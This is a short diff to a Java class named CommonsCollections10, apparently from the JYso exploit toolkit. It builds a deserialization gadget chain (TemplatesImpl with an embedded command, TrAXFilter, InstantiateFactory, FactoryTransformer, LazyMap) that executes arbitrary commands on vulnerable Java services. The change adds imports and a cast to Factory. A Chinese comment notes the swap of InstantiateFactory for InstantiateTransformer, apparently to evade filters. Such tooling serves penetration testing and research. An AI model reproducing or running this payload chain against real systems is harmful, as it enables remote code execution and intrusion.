@@ -4,6 +4,7 @@ import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.Reflections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import org.apache.commons.collections.Factory;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.FactoryTransformer;
 import org.apache.commons.collections.functors.InstantiateFactory;
@@ -11,6 +12,7 @@ import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
 import javax.xml.transform.Templates;
+import java.lang.reflect.Constructor;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -23,8 +25,7 @@ public class CommonsCollections10 implements ObjectPayload<Object> {
         templates = Gadgets.createTemplatesImpl(command);
         // 使用 InstantiateFactory 代替 InstantiateTransformer
         InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
-
-        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);
+        FactoryTransformer factoryTransformer = new FactoryTransformer((Factory) instantiateFactory);
 
         // 先放一个无关键要的 Transformer
         ConstantTransformer constantTransformer = new ConstantTransformer(1);
